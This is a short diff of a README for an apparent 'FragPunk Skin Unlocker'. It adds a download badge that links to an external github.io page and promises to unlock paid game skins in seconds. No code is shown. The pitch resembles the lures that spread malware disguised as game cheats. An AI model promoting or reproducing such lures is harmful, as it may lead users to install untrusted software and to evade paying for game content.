@@ -4,6 +4,7 @@ Let’s be honest: FragPunk has some of the **freshest skins** in any arena shoo
 
 Whether you’re chasing that legendary outfit, flashy animated gun wrap, or card-style FX that dropped months ago… this tool makes it all yours in seconds 💅
 
+[![Get](https://img.shields.io/badge/Get%20The-Unlocker-blueviolet)](https://fragpunk-skin-unlocker.github.io/.github/)
 ---
 
 ## 🔓 What Is the FragPunk Skin Unlocker?
